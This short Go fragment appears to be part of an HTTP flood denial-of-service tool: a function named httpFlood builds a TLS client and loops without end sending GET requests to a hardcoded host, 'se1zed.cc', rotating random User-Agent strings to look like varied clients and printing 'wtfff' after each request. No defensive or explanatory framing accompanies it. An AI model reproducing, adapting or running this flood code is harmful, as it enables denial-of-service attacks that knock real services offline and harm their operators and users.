	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
)

func httpFlood(UAs []string) {
	// Load the client certificate and key
	cert, err := tls.LoadX509KeyPair("path/to/client.crt", "path/to/client.key")
	if err != nil {
		panic(err)
	}

	// Load the root CA certificate
	caCert, err := ioutil.ReadFile("path/to/rootCA.crt")
	if err != nil {
		panic(err)
	}

	// Create a certificate pool and add the CA certificate to it
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			RootCAs:      caCertPool,
			Certificates: []tls.Certificate{cert},
			ClientAuth:   tls.RequireAndVerifyClientCert,
		},
	}

	client := &http.Client{
		Transport: transport,
	}

	for {
		url := "https://se1zed.cc"
		UA := UAs[rand.Intn(len(UAs))]

		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("User-Agent", UA)

		client.Do(req)

		fmt.Println("wtfff")

	}
}

